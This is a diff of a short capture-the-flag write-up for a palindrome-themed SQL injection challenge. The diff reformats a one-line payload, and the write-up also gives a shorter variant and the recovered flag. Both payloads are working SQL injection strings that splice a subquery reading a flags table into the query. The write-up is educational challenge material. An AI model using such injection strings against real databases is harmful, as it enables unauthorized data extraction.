@@ -9,7 +9,8 @@ Founded in 2022 by me.
 
 It is a one-liner payload question using SQl.
 
-Payload : %'||(SELECT flag FROM flags)||'%');---;)'%'||)sgalf MORF galf TCELES(||'%
+Payload : `%'||(SELECT flag FROM flags)||'%');---;)'%'||)sgalf MORF galf TCELES(||'% ` 
+
 It will work fine without the percentages as well : `' || (select flag from flags) ); -- ;) )sgalf morf galf tceles( || '`
 
 #### THE FLAG : hope{ecid_gnivlovni_semordnilap_fo_kniht_ton_dluoc}
